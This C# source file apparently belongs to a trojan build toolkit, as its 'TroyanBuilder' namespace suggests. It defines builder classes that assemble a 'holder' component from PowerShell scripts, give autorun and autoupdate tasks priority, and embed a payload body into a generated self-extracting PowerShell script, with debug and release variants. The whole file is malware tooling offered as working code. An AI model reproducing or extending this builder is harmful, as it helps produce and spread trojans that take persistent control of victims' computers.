namespace TroyanBuilder;

public abstract class HolderBuilder: CustomBuilder
{
    protected override string SourceDir => Path.Combine(Model.TroyanScriptDir, "holder");
    protected override string OutputFile => Model.Holder;
    
    protected override string[] PriorityTasks => new [] { "autorun" };
    protected override string[] UnpriorityTasks => new [] {"autoupdate" };
    protected override string EntryPoint => "holder";

    protected override void InternalBuild(string server)
    {
        MakeAutoExtract();
    }

    public void MakeAutoExtract()
    {
        var template = @"
$xbody = ""__BODY""
";
        var body = File.ReadAllText(Model.Body);
        template = template.Replace("__BODY", body);
        var outputPath = Path.Combine(Model.TroyanScriptDir, "holder", "consts_autoextract.ps1");
        File.WriteAllText(outputPath, template);
    }
    
    protected override List<SourceFile> GetSourceFiles()
    {
        var sourceFiles = base.GetSourceFiles();
        sourceFiles.Insert(0, new SourceFile(){Name = "utils"});
        sourceFiles.Insert(0, new SourceFile(){Name = "consts_body"});
        return sourceFiles;
    }
}

public class HolderBuilderDebug : HolderBuilder
{
    protected override string OutputFile => Model.HolderDebug;
    protected override string OutputFilePre => throw new NotImplementedException();
}

public class HolderBuilderRelease : HolderBuilder
{
    protected override string OutputFile => Model.HolderRelease;

    protected override string OutputFilePre => Model.HolderPreRelease;
}